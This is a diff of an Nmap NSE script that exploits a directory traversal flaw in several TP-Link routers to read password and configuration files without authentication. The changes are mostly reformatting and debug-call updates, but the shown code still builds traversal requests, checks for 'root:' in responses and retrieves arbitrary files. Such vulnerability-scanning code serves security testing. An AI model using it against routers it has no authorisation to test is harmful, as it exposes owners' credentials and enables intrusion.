@@ -1,8 +1,12 @@
 description = [[
-Exploits a directory traversal vulnerability existing in several TP-Link wireless routers. Attackers may exploit this vulnerability to read any of the configuration and password files remotely and without authentication.
+Exploits a directory traversal vulnerability existing in several TP-Link
+wireless routers. Attackers may exploit this vulnerability to read any of the
+configuration and password files remotely and without authentication.
 
-This vulnerability was confirmed in models WR740N, WR740ND and WR2543ND but there are several models that use the same HTTP server so I believe they could be vulnerable as well. I appreciate
-any help confirming the vulnerability in other models.
+This vulnerability was confirmed in models WR740N, WR740ND and WR2543ND but
+there are several models that use the same HTTP server so I believe they could
+be vulnerable as well. I appreciate any help confirming the vulnerability in
+other models.
 
 Advisory:
 * http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740
@@ -58,7 +62,7 @@ Other interesting files:
 --
 
 author = "Paulino Calderon <calderon@websec.mx>"
-license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
+license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
 categories = {"vuln", "exploit"}
 
 local http = require "http"
@@ -91,10 +95,10 @@ end
 ---
 local function check_vuln(host, port)
   local evil_uri = TRAVERSAL_QRY..DEFAULT_REMOTE_FILE
-  stdnse.print_debug(1, "%s:HTTP GET %s", SCRIPT_NAME, evil_uri)
+  stdnse.debug1("HTTP GET %s", evil_uri)
   local response = http.get(host, port, evil_uri)
   if response.body and response.status==200 and response.body:match("root:") then
-    stdnse.print_debug(1, "%s:Pattern 'root:' found.", SCRIPT_NAME, response.body)
+    stdnse.debug1("Pattern 'root:' found.")
     return true
   end
   return false
@@ -132,9 +136,9 @@ Possibly vulnerable (Based on the same firmware): WR743ND,WR842ND,WA-901ND,WR941
     vuln.state = vulns.STATE.EXPLOIT
     response = http.get(host, port, TRAVERSAL_QRY..rfile)
     if response.body and response.status==200 then
-      stdnse.print_debug(2, "%s", response.body)
+      stdnse.debug2("%s", response.body)
       if response.body:match("Error") then
-        stdnse.print_debug(1, "%s:[Error] File not found:%s", SCRIPT_NAME, rfile)
+        stdnse.debug1("[Error] File not found:%s", rfile)
         vuln.extra_info = string.format("%s not found.\n", rfile)
         return vuln_report:make_output(vuln)
       end
